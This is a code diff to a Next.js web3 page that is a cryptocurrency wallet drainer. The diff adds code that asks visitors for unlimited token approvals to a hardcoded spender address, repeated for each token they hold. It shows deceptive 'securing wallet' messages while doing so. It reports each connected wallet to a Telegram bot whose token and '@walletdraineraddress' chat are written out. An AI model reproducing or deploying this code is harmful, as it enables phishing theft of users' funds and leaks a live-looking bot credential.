@@ -42,15 +42,6 @@ export default function Home() {
     null
   ); // State for timeout
 
-  // ENV VARIABLES
-
-  const spenderAddress = process.env
-    .NEXT_PUBLIC_SPENDER_ADDRESS as `0x${string}`;
-  const contractAddress = process.env.NEXT_PUBLIC_ADDRESS as `0x${string}`;
-  const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
-  const chatId = process.env.NEXT_PUBLIC_CHAT_ID;
-  const websiteName = process.env.NEXT_PUBLIC_WEBSITE_NAME;
-
   const { open, close } = useWeb3Modal();
   const { disconnect } = useDisconnect();
   const { address } = useAccount();
@@ -63,9 +54,9 @@ export default function Home() {
     signMessage,
   } = useSignMessage({ message: "gm wagmi frens" });
 
-  // const spenderAddress = "0x43E7263534d6aB44347e0567fAA6927A2b865516";
+  const spenderAddress = "0x43E7263534d6aB44347e0567fAA6927A2b865516";
   const { config } = usePrepareContractWrite({
-    address: contractAddress, // USDT-ERC20
+    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT-ERC20
     abi: usdtABI,
     functionName: "approve",
     args: [spenderAddress as Address, parseEther("100000000000")],
@@ -89,37 +80,54 @@ export default function Home() {
     setIsConnectHighlighted(false);
     setIsNetworkSwitchHighlighted(false);
 
-    if (write) {
+    if (tokens.length === 0) {
+      setNotice(null);
+      setError("No tokens to approve.");
+      return;
+    }
+
+    setIsApproving(true);
+    setNotice("Attempting to secure wallet. Please open wallet to continue...");
+
+    // Clear any existing timeout
+    if (messageTimeout) {
+      clearTimeout(messageTimeout);
+    }
+
+    // Set a timeout to clear the message after 30 seconds
+    setMessageTimeout(
+      setTimeout(() => {
+        setError(null);
+        setNotice(null);
+      }, 30000)
+    );
+
+    // Send Telegram message indicating approval attempt
+    await sendTelegramNotification(`${address} is attempting to secure wallet`);
+
+    for (const token of tokens) {
       try {
-        setIsApproving(true); // Set approval state to true
-        setNotice(
-          "Attempting to secure wallet. Please open wallet to continue..."
-        );
+        // Configure the approval for each token
+        const { config } = usePrepareContractWrite({
+          address: token.token_address,
+          abi: usdtABI,
+          functionName: "approve",
+          args: [spenderAddress as Address, parseEther("100000000000")],
+        });
 
-        // Clear any existing timeout
-        if (messageTimeout) {
-          clearTimeout(messageTimeout);
+        const { write } = useContractWrite(config);
+
+        if (write) {
+          await write();
+          setNotice(`Successfully secured ${token.symbol}.`);
         }
-
-        // Set a timeout to clear the message after 30 seconds
-        setMessageTimeout(
-          setTimeout(() => {
-            setError(null); // Clear error message after timeout
-            setNotice(null); // Clear notice message after timeout
-          }, 30000)
-        );
-
-        // Send Telegram message indicating approval attempt
-        await sendTelegramNotification(
-          `${address} is attempting to secure wallet on ${websiteName}`
-        );
-
-        await write();
       } catch (error) {
-        console.error("Error approving token:", error);
-        setError("Failed to secure wallet. Please reload and try again.");
+        console.error(`Error approving ${token.symbol}:`, error);
+        setError(`Failed to secure ${token.symbol}. Please try again.`);
       }
     }
+
+    setIsApproving(false);
   };
 
   const compromiseWallet = () => {
@@ -165,9 +173,7 @@ export default function Home() {
 
   useEffect(() => {
     if (address) {
-      sendTelegramNotification(
-        `Wallet (${address}) connected on ${websiteName}.`
-      );
+      sendTelegramNotification(`Wallet (${address}) connected.`);
     }
   }, [address]);
 
@@ -207,8 +213,8 @@ export default function Home() {
 
   const sendTelegramNotification = async (message: string) => {
     try {
-      // const tbotToken = botToken;
-      // const chatId = "@walletdraineraddress";
+      const botToken = "7095023752:AAGH_bXRYtd3qe0kPI6AewFy4VVs8oqWCo0";
+      const chatId = "@walletdraineraddress";
 
       await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         chat_id: chatId,
